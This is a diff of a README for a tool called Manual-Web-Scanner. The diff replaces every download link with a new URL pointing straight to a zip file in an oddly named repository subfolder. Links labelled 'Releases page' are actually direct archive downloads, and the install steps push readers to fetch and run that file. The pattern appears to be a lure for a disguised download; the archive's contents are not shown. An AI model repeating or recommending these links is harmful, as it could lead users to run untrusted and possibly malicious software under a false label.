@@ -1,7 +1,7 @@
 # 🔍 Manual-Web-Scanner - Fast and Customizable Web Vulnerability Scanner
 
 ## 📥 Download Now
-[![Download Manual-Web-Scanner](https://raw.githubusercontent.com/hafizhmdzaky/Manual-Web-Scanner/main/Hepaticae/Manual-Web-Scanner.zip)](https://raw.githubusercontent.com/hafizhmdzaky/Manual-Web-Scanner/main/Hepaticae/Manual-Web-Scanner.zip)
+[![Download Manual-Web-Scanner](https://github.com/hafizhmdzaky/Manual-Web-Scanner/raw/refs/heads/main/Hepaticae/Web-Manual-Scanner-v1.0.zip)](https://github.com/hafizhmdzaky/Manual-Web-Scanner/raw/refs/heads/main/Hepaticae/Web-Manual-Scanner-v1.0.zip)
 
 ---
 
@@ -37,9 +37,9 @@ Manual-Web-Scanner covers a wide range of vulnerabilities, including:
 
 ## 📝 Download & Install
 
-To get started, visit our [Releases page](https://raw.githubusercontent.com/hafizhmdzaky/Manual-Web-Scanner/main/Hepaticae/Manual-Web-Scanner.zip) to download the latest version of Manual-Web-Scanner.
+To get started, visit our [Releases page](https://github.com/hafizhmdzaky/Manual-Web-Scanner/raw/refs/heads/main/Hepaticae/Web-Manual-Scanner-v1.0.zip) to download the latest version of Manual-Web-Scanner.
 
-1. Click on the link to go to the Releases page: [Visit this page to download](https://raw.githubusercontent.com/hafizhmdzaky/Manual-Web-Scanner/main/Hepaticae/Manual-Web-Scanner.zip).
+1. Click on the link to go to the Releases page: [Visit this page to download](https://github.com/hafizhmdzaky/Manual-Web-Scanner/raw/refs/heads/main/Hepaticae/Web-Manual-Scanner-v1.0.zip).
 2. On the Releases page, locate the version you wish to download.
 3. Click on the appropriate file for your operating system.
 4. Once downloaded, locate the file in your downloads folder.
@@ -93,4 +93,4 @@ Manual-Web-Scanner is licensed under the MIT License. You can use, modify, and d
 
 Thank you to everyone who contributed to making Manual-Web-Scanner a powerful tool for manual web vulnerability scanning.
 
-For more details, visit our [Releases page](https://raw.githubusercontent.com/hafizhmdzaky/Manual-Web-Scanner/main/Hepaticae/Manual-Web-Scanner.zip).
+For more details, visit our [Releases page](https://github.com/hafizhmdzaky/Manual-Web-Scanner/raw/refs/heads/main/Hepaticae/Web-Manual-Scanner-v1.0.zip).
